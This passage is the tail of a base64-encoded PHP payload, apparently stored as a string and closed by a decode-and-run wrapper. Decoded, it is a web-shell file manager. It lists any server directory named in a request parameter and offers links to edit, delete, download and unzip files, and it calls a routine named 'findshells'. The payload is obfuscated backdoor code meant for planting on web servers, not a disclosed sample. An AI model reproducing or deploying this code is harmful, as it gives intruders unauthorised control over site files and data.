8dGQ+PC90ZD48dGQ+PC90ZD48dGQ+PC90ZD48dGQ+PC90ZD48L3RyPiI7CgkJCX0KCQkJZWxzZQoJCQl7CgkJCQlzaWRlX2JhcigkbWFrZV9maWxlKTsKCQkJCWVjaG8gIjx0ciBhbGlnbj1cImNlbnRlclwiPjx0ZCBhbGlnbj1cImxlZnRcIiA+Ii4iPGZvbnQgY29sb3I9XCJyZWRcIj5DYW4gbm90IGNyZWF0ZSBmb2xkZXIhPC9mb250PjwvdGQ+Ii4iPHRkPjwvdGQ+PHRkPjwvdGQ+PHRkPjwvdGQ+PHRkPjwvdGQ+PC90cj4iOwoJCQl9CgkJfQoJCWVsc2VpZiAoIWVtcHR5KCRfUE9TVFsnc2VhcmNoX2ZpbGUnXSkpCgkJewoJCQkkZmlsZV9uYW1lX2Zvcl9zZWFyY2ggPSAkX1BPU1RbJ3NlYXJjaF9maWxlJ107CgkJCSRhcnJfYWxsX2ZpbGVuYW1lcyA9IGZpbmRzaGVsbHMoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSk7CgkJCQkKCQkJaWYgKGlzc2V0ICgkX0dFVFsnZGlyJ10pKQoJCQkJJGRyID0gJF9HRVRbJ2RpciddOwoJCQllbHNlCgkJCQkkZHIgPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOwoJCQkKCQkJc2lkZV9iYXIoJG1ha2VfZmlsZSk7CgkJCQoJCQlmb3JlYWNoICgkYXJyX2FsbF9maWxlbmFtZXMgYXMgJGVhY2hfZmlsZV9uYW1lKQoJCQl7CgkJCQkkcmVzdWx0ID0gc3RyaXN0cigkZWFjaF9maWxlX25hbWUsICRmaWxlX25hbWVfZm9yX3NlYXJjaCk7CgkJCQlpZiAoJHJlc3VsdCAhPT0gZmFsc2UpCgkJCQl7CgkJCQkJJHRpbWUgPSBnZXRfdGltZSgkZWFjaF9maWxlX25hbWUpOwoJCQkJCSRyZWFsX3VybCA9IHN0cl9yZXBsYWNlKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10sICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLCAkZWFjaF9maWxlX25hbWUpOwoJCQkJCWVjaG8gIjx0ciBiZ2NvbG9yPVwiI2ZmZmZmZlwiIGFsaWduPVwiY2VudGVyXCI+PHRkIGFsaWduPVwibGVmdFwiID4iLiI8YSBzdHlsZT1cInRleHQtZGVjb3JhdGlvbjogbm9uZTtcIiBocmVmPVwiaHR0cDovLyRkb21haW4kc2NyaXB0X3BhdGg\/ZWRpdD0kZWFjaF9maWxlX25hbWUmZGlyPSRkclwiPjxmb250IGNvbG9yPVwiYmxhY2tcIj4kZWFjaF9maWxlX25hbWU8L2ZvbnQ+PC9hPiIuIjwvdGQ+PHRkPiIuZ2V0X2ZpbGVzaXplKCRlYWNoX2ZpbGVfbmFtZSkuIjwvdGQ+PHRkPiR0aW1lPC90ZD48dGQ+Ii5wZXJtcygkZWFjaF9maWxlX25hbWUsICcwJykuIjwvdGQ+PHRkPiIuIjxhIGhyZWY9XCJodHRwOi8vJGRvbWFpbiRzY3JpcHRfcGF0aD9kZWw9JGVhY2hfZmlsZV9uYW1lJmRpcj0kZHJcIj5VPC9hPiZuYnNwOyIuIjxhIGhyZWY9XCJodHRwOi8vJGRvbWFpbiRzY3JpcHRfcGF0aD9lZGl0PSRlYWNoX2ZpbGVfbmFtZSZkaXI9JGRyXCI+RTwvYT4mbmJzcDsiLiI8YSB0YXJnZXQ9XCJfYmxhbmtcIiBocmVmPVwiaHR0cDovLyRyZWFsX3VybFwiPk88L2E+Jm5ic3A7Ii4iPGEgaHJlZj1cImh0dHA6Ly8kZG9tYWluJHNjcmlwdF9wYXRoP2Rvd25sb2FkPSRlYWNoX2ZpbGVfbmFtZSZkaXI9JGRyXCI+RDwvYT4iLiI8L3RkPjwvdHI+IjsKCQkJCX0KCQkJfQoJCX0KCQkKCQkKCWlmIChpc3NldCAoJF9HRVRbJ2VkaXQnXSkpCgl7CgkJJGN1cnJlbnQgPSAkZG9tYWluLiRzY3JpcHRfcGF0aDsKCQllZGl0X2ZpbGUoJF9HRVRbJ2VkaXQnXSwgJGN1cnJlbnQpOwoJfQoJPz4KCQoJPHRyIGFsaWduPSJjZW50ZXIiIHN0eWxlPSJjb2xvcjogIzQyM2M2MzsiPjx0ZCBhbGlnbj0ibGVmdCI+PGI+TmFtZTwvYj48L3RkPjx0ZD48Yj5TaXplPC9iPjwvdGQ+PHRkPjxiPk1vZGlmeTwvYj48L3RkPjx0ZD48Yj5QZXJtaXNzaW9uczwvYj48L3RkPjx0ZD48Yj5BY3Rpb25zPC9iPjwvdGQ+PC90cj4KCgk8P3BocAoJCglpZiAoaXNzZXQgKCRfR0VUWydkaXInXSkpCgl7CgkJJGFycl9maWxlcyA9IHNjYW5kaXIoJF9HRVRbJ2RpciddKTsKCX0KCWVsc2UKCXsKCQkkYXJyX2ZpbGVzID0gc2NhbmRpcigkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKTsKCX0KCglmb3JlYWNoICgkYXJyX2ZpbGVzIGFzICRlYWNoKQoJewoJCSRzdHJfZm9yX3NlYXJjaCA9ICRlYWNoOwoJCWlmIChpc3NldCAoJF9HRVRbJ2RpciddKSkKCQkJJHN0cl9mb3Jfc2VhcmNoID0gJF9HRVRbJ2RpciddLicvJy4kZWFjaDsKCQllbHNlCgkJCSRzdHJfZm9yX3NlYXJjaCA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10uJy8nLiRlYWNoOwoKCQlpZiAoaXNfZGlyKCRzdHJfZm9yX3NlYXJjaCkpCgkJCSRhcnJfZm9sZGVyW10gPSAkZWFjaDsKCQllbHNlCgkJCSRhcnJfZmlsZW5hbWVzW10gPSAkZWFjaDsKCX0KCSRrID0gMDsJCglmb3JlYWNoICgkYXJyX2ZvbGRlciBhcyAkZWFjaCkKCXsKCQlpZiAoKCRlYWNoICE9PSAnLicpIGFuZCAoJGVhY2ggIT09ICcuLicpKQoJCXsKCQkJaWYgKGlzc2V0ICgkX0dFVFsnZGlyJ10pKQoJCQl7CgkJCQkkcCA9ICRfR0VUWydkaXInXS4nLycuJGVhY2g7CgkJCQkkbmV4dF9kaXIgPSAkX0dFVFsnZGlyJ10uJy8nLiRlYWNoOwoJCQl9CgkJCWVsc2UKCQkJewoJCQkJJHAgPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLicvJy4kZWFjaDsKCQkJCSRuZXh0X2RpciA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10uJy8nLiRlYWNoOwoJCQl9CgkJCQoJCQkkcGF0aF9mb3JfdW5saW5rID0gJG5leHRfZGlyOwoJCQkkZm9yX2RlbCA9IHN0cnJjaHIoJHBhdGhfZm9yX3VubGluaywgJy8nKTsKCQkJJHBhdGhfZm9yX3VubGluayA9IHN0cl9yZXBsYWNlKCRmb3JfZGVsLCAnJywgJHBhdGhfZm9yX3VubGluayk7CgkJCgkJCSR0aW1lID0gZ2V0X3RpbWUoJHApOwoJCQkKCQkJaWYgKCRrICUgMiA9PSAwKQoJCQkJJGNvbG9yX2JnID0gJyNmZmY4ZTcnOwoJCQllbHNlCgkJCQkkY29sb3JfYmcgPSAnI2ZmZmZlMCc7CgkJCQoJCQllY2hvICI8dHIgYmdjb2xvcj1cIiRjb2xvcl9iZ1wiIGFsaWduPVwiY2VudGVyXCI+PHRkIGFsaWduPVwibGVmdFwiID4iLiI8Zm9udCBjb2xvcj1cIiM5MDRkMzBcIj48Yj48YSBocmVmPVwiaHR0cDovLyRkb21haW4kc2NyaXB0X3BhdGg\/ZGlyPSRuZXh0X2RpclwiPiRlYWNoPC9hPjwvYj48L2ZvbnQ+Ii4iPC90ZD48dGQ+ZGlyPC90ZD48dGQ+JHRpbWU8L3RkPjx0ZD4iLnBlcm1zKCRwLCAnMCcpLiI8L3RkPjx0ZD4iLiI8YSBocmVmPVwiaHR0cDovLyRkb21haW4kc2NyaXB0X3BhdGg\/ZGVsPSRwJmRpcj0kcGF0aF9mb3JfdW5saW5rXCI+VTwvYT4mbmJzcDsiLiI8L3RkPjwvdHI+IjsKCQkJJGsrKzsKCQl9Cgl9CgkKCglmb3JlYWNoICgkYXJyX2ZpbGVuYW1lcyBhcyAkZWFjaCkKCXsKCQkKCQlpZiAoaXNzZXQgKCRfR0VUWydkaXInXSkpCgkJewoJCQkkcCA9ICRfR0VUWydkaXInXS4nLycuJGVhY2g7CgkJCSRkciA9ICRfR0VUWydkaXInXTsKCQl9CgkJCQoJCWVsc2UKCQl7CgkJCSRwID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXS4nLycuJGVhY2g7CgkJCSRkciA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107CgkJfQoJCSR0aW1lID0gZ2V0X3RpbWUoJHApOwoJCQoJCSRyZWFsX3VybCA9IHN0cl9yZXBsYWNlKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10sICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLCAkcCk7CgkJCgkJaWYgKCRrICUgMiA9PSAwKQoJCQkkY29sb3JfYmcgPSAnI2ZmZjhlNyc7CgkJZWxzZQoJCQkkY29sb3JfYmcgPSAnI2ZmZmZlMCc7CgoJCSRwZXIgPSBzdHJpc3RyKCRlYWNoLCAnLnppcCcpOwoJCWlmICgkcGVyICE9PSBmYWxzZSkKCQkJJHBlciA9ICI8YSBocmVmPVwiaHR0cDovLyRkb21haW4kc2NyaXB0X3BhdGg\/dW56aXA9JHAmZGlyPSRkclwiPlo8L2E+Jm5ic3A7IjsKCQllbHNlCgkJCSRwZXIgPSAiPGEgaHJlZj1cImh0dHA6Ly8kZG9tYWluJHNjcmlwdF9wYXRoP2VkaXQ9JHAmZGlyPSRkclwiPkU8L2E+Jm5ic3A7IjsKIAoJCWVjaG8gIjx0ciBiZ2NvbG9yPVwiJGNvbG9yX2JnXCIgYWxpZ249XCJjZW50ZXJcIj48dGQgYWxpZ249XCJsZWZ0XCIgPiIuIjxhIHN0eWxlPVwidGV4dC1kZWNvcmF0aW9uOiBub25lO1wiIGhyZWY9XCJodHRwOi8vJGRvbWFpbiRzY3JpcHRfcGF0aD9lZGl0PSRwJmRpcj0kZHJcIj48Zm9udCBjb2xvcj1cImJsYWNrXCI+JGVhY2g8L2ZvbnQ+PC9hPiIuIjwvdGQ+PHRkPiIuZ2V0X2ZpbGVzaXplKCRwKS4iPC90ZD48dGQ+JHRpbWU8L3RkPjx0ZD4iLnBlcm1zKCRwLCAnMCcpLiI8L3RkPjx0ZD4iLiI8YSBocmVmPVwiaHR0cDovLyRkb21haW4kc2NyaXB0X3BhdGg\/ZGVsPSRwJmRpcj0kZHJcIj5VPC9hPiZuYnNwOyIuJHBlci4iPGEgdGFyZ2V0PVwiX2JsYW5rXCIgaHJlZj1cImh0dHA6Ly8kcmVhbF91cmxcIj5PPC9hPiZuYnNwOyIuIjxhIGhyZWY9XCJodHRwOi8vJGRvbWFpbiRzY3JpcHRfcGF0aD9kb3dubG9hZD0kcCZkaXI9JGRyXCI+RDwvYT4iLiI8L3RkPjwvdHI+IjsKCQkKCQkkaysrOwoJfQo\/Pgo8L3RhYmxlPgo8P3BocApleGl0KCk7Cn0KPz4=\"))\r\n ?>"
}
